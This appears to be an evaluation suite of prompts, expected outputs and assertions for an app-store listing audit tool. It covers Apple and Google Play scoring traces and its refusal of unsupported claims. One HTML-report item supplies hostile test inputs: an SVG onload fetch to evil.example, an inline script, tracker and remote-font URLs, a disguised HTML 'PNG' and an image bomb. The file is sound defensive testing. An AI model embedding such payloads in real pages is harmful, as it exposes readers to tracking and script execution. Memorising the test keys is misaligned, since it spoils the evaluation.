evals.prompt: Audit this captured public Apple App Store listing for Trail Ledger before the autumn release. Store ID: 123456789; canonical URL: https://apps.apple.com/us/app/trail-ledger/id123456789; storefront: US; locale: en-US; capture date: 2026-07-20. Captured fields: name 'Trail Ledger'; subtitle 'Plan every hike'; promotional text 'Offline trail maps for summer'; description opens with 'Save routes, record mileage, and share trail notes.' The dated campaign record says the summer promotion ended 2026-07-01 and the current autumn brief emphasizes all-season offline navigation. Store-browse viewport is 412x732 CSS px with screenshots rendered at 360 CSS px wide. Screenshot 1 says 'Choose a route' at 26 CSS px with 5.2:1 contrast and no obstruction; it shows a product-specific route picker but does not show offline navigation or mileage recording. Screenshot 2 says 'Track the climb' at 16 CSS px with 1.9:1 contrast and has 20 CSS px of its lower caption obscured by the phone mockup; it shows a product-specific elevation chart. Screenshot 3 says 'Save notes' at 24 CSS px with 6.1:1 contrast and no obstruction; it shows a product-specific trail note editor. The sequence covers planning, tracking, and notes but supplies no concluding user benefit. App preview: present, 15 seconds, opens on an unlabeled map, shows route recording, and ends before a saved-route result. Rating 4.6 from 842 ratings; visible review excerpt: 'Easy to use, but export is hard to find.'; age rating 4+ with no inconsistent listing claim; release notes dated 2026-07-12 state 'Added home-screen widgets' with no contradictory listing claim; dated query-result capture supplied for 'trail planner'. The App Store Connect keyword field, product-page optimization plan, and experiment result are unavailable. Use the fixed Apple six-dimension card and this exact check trace: APL-DSC-01 partial 5/10 finding trail-ledger-APL-DSC-01-01; APL-DSC-02 unavailable max 10; APL-MET-01 partial 3/6 finding trail-ledger-APL-MET-01-01; APL-MET-02 pass 5/5; APL-MET-03 fail 0/3 finding trail-ledger-APL-MET-03-01; APL-MET-04 partial 3/6 finding trail-ledger-APL-MET-04-01; APL-CRT-01 partial 4/8 finding trail-ledger-APL-CRT-01-01; APL-CRT-02 partial 4/8 finding trail-ledger-APL-CRT-02-01; APL-CRT-03 partial 1.5/3 finding trail-ledger-APL-CRT-03-01; APL-CRT-04 partial 0.5/1 finding trail-ledger-APL-CRT-04-01; APL-CRT-05 pass 1/1; APL-CRT-06 partial 2/4 finding trail-ledger-APL-CRT-06-01; APL-TRU-01 pass 3/3; APL-TRU-02 partial 2.5/5 finding trail-ledger-APL-TRU-02-01; APL-TRU-03 pass 3/3; APL-TRU-04 pass 4/4; APL-LOC-01 pass 5/5; APL-LOC-02 pass 5/5; APL-EXP-01 unavailable max 5; APL-EXP-02 unavailable max 5. Report the calculated evidence coverage and score.
evals.expected_output: Runs a public-first Apple listing audit from the dated capture before requesting private evidence. It uses the approved six-dimension Apple card, applies only 100/50/0 awards to assessed checks, keeps unavailable checks outside score math, and reports the exact check-level trace with finding-linked deductions.

Routes the supplied URL to Apple App Store analysis. [eval 201]

evals.prompt: Review this captured public Google Play listing for Pantry Pilot. Package: com.example.pantrypilot; canonical URL: https://play.google.com/store/apps/details?id=com.example.pantrypilot; locale: en-US; country: US; capture date: 2026-07-20. Captured fields: title 'Pantry Pilot'; short description 'Plan meals from what you own'; full description has headings 'Scan', 'Plan', and 'Share'; each section gives concrete pantry-scan or meal-plan steps; the Share section claims offline sync while the supplied product capability record says sharing requires a network connection. For GPL-MET-03, structure passes, specificity passes, and alignment fails. Category 'Food & Drink'; content rating 'Everyone'; Data safety container failed to render, so its presence and consistency properties are unavailable; feature graphic text 'Waste less this week'; promotional video: absent; screenshots: 4 portrait images; rating 4.2 from 1,240 reviews; visible review excerpt: 'The scan works, but shared lists need work.' Play Console acquisition and experiment data are unavailable. We need a listing audit, not help changing the Android app.

It aggregates the fully assessed GPL-MET-03 properties to one partial row at 4/8 without subweights, marks the entire GPL-TRU-04 row unavailable because a required property cannot be established, and keeps unavailable evidence outside score awards and deductions.

evals.prompt: Only audit the first three portrait screenshots from this captured US Google Play listing for a meditation timer. Package: com.example.meditationtimer; canonical URL: https://play.google.com/store/apps/details?id=com.example.meditationtimer; locale: en-US; country: US; capture date: 2026-07-20. Store-browse preview viewport: 412x732 CSS px; rendered screenshot width: 360 CSS px. Screenshot 1, 1080x1920: headline 'One minute to settle' at 27 CSS px, white on #173D63 with 11.15:1 contrast, positioned 84 CSS px below the top, fully visible; phone image shows a circular timer. Screenshot 2, 1080x1920: headline 'Pick a sound' at 16 CSS px, #A0B0B5 on #E6E9EA with 1.84:1 contrast, with its lower 18 CSS px hidden behind the phone mockup; phone image shows rain, waves, and bell choices. Screenshot 3, 1080x1920: headline 'Keep your streak' at 24 CSS px, white on #24543D with 8.71:1 contrast, fully visible; phone image shows a seven-day calendar. I am deciding whether their first-impression story works. Do not review metadata, ratings, or the app itself.

evals.prompt: Create a single offline HTML ASO audit report from this exact underlying audit record. Scope: listing mode; Google Play; app Pantry Pilot; package com.example.pantrypilot; country US; locale en-US; capture date 2026-07-20. Source S1: https://play.google.com/store/apps/details?id=com.example.pantrypilot, captured 2026-07-20. Source S2: owner-supplied audit brief, received 2026-07-20. Applicable fixed-check trace: GPL-MET-01 verified pass 6/6; GPL-MET-02 verified partial 3/6 finding pantry-pilot-GPL-MET-02-01; GPL-MET-03 verified fail 0/8 finding pantry-pilot-GPL-MET-03-01; GPL-CRT-02 verified partial 4/8 finding pantry-pilot-GPL-CRT-02-01; GPL-TRU-01 verified pass 3/3; GPL-TRU-02 unavailable max 4 with request for a dated 20-review US en-US sample. Not applicable trace: GPL-DSC-01, GPL-DSC-02, GPL-DSC-03, GPL-DSC-04, GPL-CRT-01, GPL-CRT-03, GPL-CRT-04, GPL-CRT-05, GPL-TRU-03, GPL-TRU-04, GPL-TRU-05, GPL-LOC-01, GPL-LOC-02, GPL-EXP-01, GPL-EXP-02. Score: earned 16; assessed max 31; score 51.61%. Coverage: assessed applicable max 31; all applicable max 35; coverage 88.57%. Finding pantry-pilot-GPL-MET-03-01: verified fail; check GPL-MET-03; observed impact 'Full description is one 42-word paragraph with no pantry-scan steps.'; action 'Rewrite into three sections: scan; inventory; meal plan.'; completion 'A dated listing capture shows all three sections.'; effort M; source S1; date 2026-07-20. Finding pantry-pilot-GPL-CRT-02-01: verified partial; check GPL-CRT-02; observed impact 'The first screenshot says Waste less but shows an unlabeled pantry grid rather than a scan action.'; action 'Show an item scan followed by the resulting inventory state.'; completion 'A dated screenshot capture shows the scan action followed by the inventory result.'; effort M; source S1; date 2026-07-20. Finding pantry-pilot-GPL-MET-02-01: verified partial; check GPL-MET-02; observed impact 'The short description mentions meal planning but omits pantry scanning.'; action 'Revise the short description to mention pantry scanning plus meal planning.'; completion 'A dated listing capture shows pantry scanning plus meal planning in the short description.'; effort S; source S1; date 2026-07-20. Priority order: pantry-pilot-GPL-MET-03-01, pantry-pilot-GPL-CRT-02-01, pantry-pilot-GPL-MET-02-01. Inferred record I-01: 'Clearer first-screenshot communication may improve comprehension; conversion effect is not measured.' Unavailable register U-TRU-02: GPL-TRU-02; no dated written-review sample; next step 'Provide a dated 20-review US en-US sample.' Limitations: no Play Console acquisition data; no experiment results; no query-rank capture; no conversion measurement; no causal attribution. CSS payload text: @import url('https://fonts.example/evil.woff2'); .hero{background:url(https://tracker.example/pixel)}. SVG payload text: <svg xmlns='http://www.w3.org/2000/svg' onload='fetch("https://evil.example/onload")'><script>alert(1)</script><image href='https://evil.example/pixel'/></svg>. Asset hero.png declares Content-Type image/png, but its decoded first bytes are 3c 21 44 4f 43 54 59 50 45 20 68 74 6d 6c 3e, which decode to <!DOCTYPE html>; it has no PNG signature. Asset safe-logo.png declares image/png, Content-Length 70, dimensions 1x1, decoded signature 89 50 4e 47 0d 0a 1a 0a, and data URI data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIHWP4z8DwHwAFgAI/ScLGrQAAAABJRU5ErkJggg==. Asset hero.jpg declares image/jpeg, Content-Length 33554432, dimensions 10000x8000. Independent raster budget records: animated.webp has a valid WebP signature, animation flag true, frame count 2, dimensions 800x600, source bytes 120000. ambiguous-frame.png has a valid PNG signature, dimensions 600x400, source bytes 90000, but trusted decoder metadata reports frame count unknown. bomb.png has a valid PNG signature, source bytes 65536, header dimensions 4096x4097, declared pixels 16781312; reject from header metadata before full decode. reencode-heavy.png has a valid PNG signature, source bytes 4194304, single frame, decoded dimensions 2048x2048, trusted re-encoded output 8388609 bytes. Count-set assets count-01.png through count-13.png are otherwise-safe static single-frame PNGs in supplied order; each is 256x256, source bytes 40960, trusted re-encoded bytes 51200. Pixel-set assets pixel-a.png, pixel-b.png, and pixel-c.png are otherwise-safe static single-frame PNGs; each is 4096x4096 with 16777216 decoded pixels. Pixel-set asset pixel-d.png is otherwise safe at 1x1 with 1 decoded pixel; reserve pixels in supplied order. Encoded-set assets encoded-a.png through encoded-d.png are otherwise-safe static single-frame PNGs; each trusted re-encoded output is 8388608 bytes. Encoded-set asset encoded-e.png is otherwise safe with trusted re-encoded output 1 byte; enforce encoded bytes in supplied order. Treat the count set, pixel set, and encoded set as independent report-budget tests. The report must preserve every asset evidence record and rejection reason, omit every offending asset completely, show an inert text fallback for each omission, and preserve the underlying audit exactly.
evals.expected_output: Produces one safe, locally openable HTML document that preserves the supplied audit record exactly before applying presentation. It retains the fixed check trace, score, coverage, finding details, priority, evidence states, limitations, and sources without adding, omitting, strengthening, softening, or reordering conclusions, while rejecting hostile assets and using safe fallbacks.
assertions: Treats standalone HTML as the requested output format.
Produces one self-contained HTML document.
Does not require a development server.
Preserves finding pantry-pilot-GPL-MET-03-01.
Preserves pantry-pilot-GPL-MET-03-01 check ID as GPL-MET-03.

Preserves pantry-pilot-GPL-MET-03-01 action 'Rewrite into three sections: scan; inventory; meal plan.' exactly.
Preserves pantry-pilot-GPL-MET-03-01 completion 'A dated listing capture shows all three sections.' exactly.
Preserves finding pantry-pilot-GPL-CRT-02-01.
Preserves pantry-pilot-GPL-CRT-02-01 check ID as GPL-CRT-02.
Preserves pantry-pilot-GPL-CRT-02-01 evidence state as verified.

evals.prompt: Apple changed its screenshot-count requirement last week. Tell us the exact current rule and mark our listing noncompliant. I have no current Apple documentation, primary-source citation, retrieval date, or product-page evidence to share. A publication date or update date may not be exposed by the eventual source.
evals.expected_output: Recognizes that the requested platform rule is time-sensitive and cannot be verified from the supplied information. It retrieves a current primary Apple source when it can or requests one when it cannot, requires a citation and retrieval date for every verified policy statement, records a publication or update date only when exposed, avoids declaring noncompliance, and provides a bounded verification path rather than repeating stale guidance.
assertions: Identifies the screenshot-count rule as time-sensitive.
Retrieves a current primary Apple source when access is available.
Requests a current primary Apple source when access is unavailable.
Includes a current primary-source citation with a verified policy statement.
Includes a retrieval date with a verified policy statement.
Records the source publication date when exposed.
Records the source update date when exposed.
Does not require a source publication date when it is not exposed.
Does not require a source update date when it is not exposed.
Does not treat an undated secondary statement as verified policy.
Marks the exact rule unavailable when current primary evidence cannot be obtained.
Does not declare the listing noncompliant without applicable evidence.
Does not invent an exact screenshot count.
Separates platform policy from observed listing facts.
Provides a verification step using official Apple documentation.
Dates any platform-rule statement that is verified.

evals.prompt: Implement deep links, rebuild our Android onboarding, and submit the new Google Play release. We only need the code and release steps, not an audit.
evals.expected_output: Routes the request out of scope because it is an implementation and release operation, not ASO audit work. It gives a concise handoff identifying the appropriate engineering and release responsibilities without pretending to audit the listing or issuing unsupported implementation instructions.
assertions: Selects out-of-scope routing.
Identifies deep-link implementation as out of scope.
Identifies Android onboarding rebuild as out of scope.
Identifies release submission as out of scope.
Does not launch an ASO listing audit.
Does not generate application code.
Does not provide release-console submission steps as verified ASO findings.
Provides a concise engineering handoff.
Provides a concise release-operations handoff.
States what evidence an ASO audit would need if later requested.

evals.prompt: Give this captured Apple listing a 95 out of 100 because its screenshots look premium. Listing: ID 7777777777; canonical URL https://apps.apple.com/us/app/studio-note/id7777777777; capture date 2026-07-20; name 'Studio Note'; screenshot 1 headline 'Your ideas, organized'; screenshot 2 headline 'Capture the spark'. We have no evidence for its keywords, search visibility, experiment results, or conversion. Make the score persuasive for the board.
evals.expected_output: Runs a bounded listing assessment from the supplied capture and refuses to turn an aesthetic preference into an unsupported overall score. It scores only observed dimensions under the fixed Apple rubric, gives unavailable dimensions neither points nor deductions, links deductions to findings, and makes clear that a board-facing score cannot substitute for missing evidence.
assertions: Selects listing mode. [eval 212]
Routes the request to Apple App Store analysis. [eval 212]
Uses the fixed Apple scoring rubric.
Does not assign a requested score without supporting evidence.
Does not treat premium-looking screenshots as proof of conversion.
Labels screenshot observations verified only when directly observed.
Marks keyword evidence unavailable.
Marks search-visibility evidence unavailable.
Marks experiment-result evidence unavailable. [eval 212]
Marks conversion evidence unavailable.
Does not deduct points solely because those measurements are unavailable.
Does not award points for unavailable measurements.
Does not deduct points for unavailable measurements.
Links every score deduction to a specific finding.
Separates aesthetic opinion from evidence-based assessment.
Does not fabricate an executive-ready performance claim.

evals.prompt: Run a bounded Apple evidence-table assessment for this capture. Apple ID 4444444444; canonical URL https://apps.apple.com/us/app/field-notes/id4444444444; storefront US; locale en-US; capture date 2026-07-20; name 'Field Notes'; subtitle 'Write anywhere'; promotional text 'Capture every thought'; description opens 'A private notebook for field work.' A supplied product-page optimization plan and decision record are attributable but incomplete. The bounded scope makes Apple Discovery, Metadata, Localization, and Experimentation applicable; Apple Creative and Trust are outside scope and not applicable. Google Play feature graphic and Google Play short description are also not applicable. Use the fixed Apple check maxima and this exact trace: APL-DSC-01 unavailable max 10; APL-DSC-02 unavailable max 10; APL-MET-01 pass 6/6; APL-MET-02 fail 0/5 finding field-notes-APL-MET-02-01; APL-MET-03 partial 1.5/3 finding field-notes-APL-MET-03-01; APL-MET-04 pass 6/6; APL-LOC-01 pass 5/5; APL-LOC-02 partial 2.5/5 finding field-notes-APL-LOC-02-01; APL-EXP-01 partial 2.5/5 finding field-notes-APL-EXP-01-01; APL-EXP-02 partial 2.5/5 finding field-notes-APL-EXP-02-01. Mark APL-CRT-01, APL-CRT-02, APL-CRT-03, APL-CRT-04, APL-CRT-05, APL-CRT-06, APL-TRU-01, APL-TRU-02, APL-TRU-03, and APL-TRU-04 not applicable. Report evidence coverage and score.

evals.prompt: Investigate a reported 18 percent decline in organic installs for our iOS app from 2026-07-01 through 2026-07-14 versus the prior 14 days. We have no App Store Connect acquisition export, attribution report, experiment result, or query-rank capture. Use these same-date US Apple App Store snapshots as public evidence and compare only the first two screenshots. Target Route Ready: Apple ID 5555555555; storefront US; locale en-US; capture date 2026-07-20; name 'Route Ready'; subtitle 'Plan a better commute'; screenshot 1 says 'Leave on time' at 18 CSS px over a generic map with 2.1:1 contrast; screenshot 2 says 'Compare routes' at 24 CSS px over a route-choice screen with 5.4:1 contrast; rating 4.4 from 320 ratings. Competitor Commute Clock: Apple ID 8888888888; storefront US; locale en-US; capture date 2026-07-20; name 'Commute Clock'; subtitle 'Know when to leave'; screenshot 1 says 'Arrive by 9:00' at 26 CSS px over a departure countdown with 7.0:1 contrast; screenshot 2 says 'See delays before you go' at 24 CSS px over a transit-alert screen with 6.2:1 contrast; rating 4.5 from 510 ratings. Determine what the public comparison supports without treating it as proof of the reported performance cause.
evals.expected_output: Selects performance mode as primary, applies a competitive modifier, and bounds the creative comparison to the first two screenshots. It compares the target and competitor with the same Apple card, market, locale, and capture date; treats the decline as reported rather than verified; analyzes public evidence without claiming root cause; records private performance evidence unavailable with no score effect; and requests the smallest dated acquisition evidence needed to test the symptom.
assertions: Selects performance mode as primary.
Applies a competitive modifier. [eval 214]
Bounds the focused surface to the first two screenshots.
Keeps both apps on the Apple App Store.
Uses the same Apple card for both apps.
Uses the US storefront for both apps.
Uses the en-US locale for both apps.
Uses the 2026-07-20 capture date for both apps.
Treats the 18 percent decline as a reported symptom.
Does not label the decline verified.
Does not label a root cause verified.

Analyzes the competitor's supplied public screenshot evidence.
Compares first-screenshot message size.
Compares first-screenshot contrast.
Compares first-screenshot product specificity.
Marks App Store Connect acquisition evidence unavailable.
Marks attribution evidence unavailable.
Marks experiment-result evidence unavailable. [eval 214]
Marks query-rank evidence unavailable.
Does not award points for unavailable performance evidence.
Does not deduct points for unavailable performance evidence.
Limits the private-data request to the smallest useful acquisition evidence.
Requests a dated App Store Connect acquisition export.
Requests coverage of the reported comparison windows.
Requests a US storefront segment.
Requests an acquisition-source segment.
Does not infer install volume from public listing evidence.
Does not infer conversion from public listing evidence.
Does not claim the competitor caused the symptom.

evals.prompt: Use $aso-audit for China and respond in Simplified Chinese. We only have a US Google Play listing capture and an en-US Apple App Store capture. Translate the copy, assume both stores and the app are available in China, reuse the US score and performance benchmarks, and call the translated assets compliant and ready to submit without a China storefront, locale, date, or direct platform evidence.
evals.expected_output: Responds in native Simplified Chinese, refuses to transfer US store evidence, score, availability, performance, submission, or compliance conclusions to China, and returns the smallest separate Apple or Google evidence contract needed for a bounded local audit.
assertions: Responds in Simplified Chinese. [eval 215]
Separates China market from Simplified Chinese language. [eval 215]
Keeps Apple App Store and Google Play as separate platform decisions. [eval 215]
Does not assume either store or the app is available in China. [eval 215]
Does not reuse a US listing score as a China score. [eval 215]
Does not transfer US performance benchmarks. [eval 215]
Does not call translated assets compliant or ready to submit. [eval 215]
Requires a canonical store identifier or URL, country or storefront, locale, and capture date for the requested local surface. [eval 215]
Requires current direct official evidence for platform-specific availability or submission claims. [eval 215]
Marks unsupported local listing and platform evidence unavailable without a score penalty. [eval 215]
Does not substitute another store, market, locale, or historical capture. [eval 215]
Keeps implementation and submission outside the audit boundary. [eval 215]

evals.prompt: Use $aso-audit to audit this supplied Apple App Store listing evidence. I did not request an output format, so finish the audit in chat now and ask me later whether I also want HTML. App: Quiet Focus; Apple ID 9999999999; canonical URL https://apps.apple.com/us/app/quiet-focus/id9999999999; storefront US; locale en-US; capture date 2026-07-23; mode listing. Use the fixed Apple card, preserve missing private evidence as unavailable without penalty, calculate score and evidence coverage, and deliver the findings and roadmap.
evals.expected_output: Completes the bounded Apple audit and, without asking or waiting for another turn, creates and verifies one standalone offline HTML report as the default primary artifact. It returns the local file path and a concise summary while preserving the exact evidence states, score, coverage, findings, unavailable register, limitations, and roadmap.
assertions: Selects listing mode for the supplied Apple listing. [eval 216]
Uses the fixed Apple card and evidence-scoped scoring rules. [eval 216]
Keeps missing private evidence unavailable and unpenalized. [eval 216]
Calculates and reports both score and evidence coverage with their denominators. [eval 216]
Generates HTML by default even though the prompt does not request an output format. [eval 216]
Does not ask whether the requester wants an HTML report. [eval 216]
Does not defer HTML generation to a later turn or optional follow-up. [eval 216]
Creates one standalone script-free locally openable HTML file in the same task. [eval 216]
Names the file quiet-focus-apple-aso-audit.html. [eval 216]
Preserves the audit evidence states, point trace, score, coverage, findings, unavailable register, limitations, and roadmap in HTML. [eval 216]
Runs available structural and visual checks before claiming completion. [eval 216]
Returns the local HTML path with a concise conversational summary. [eval 216]
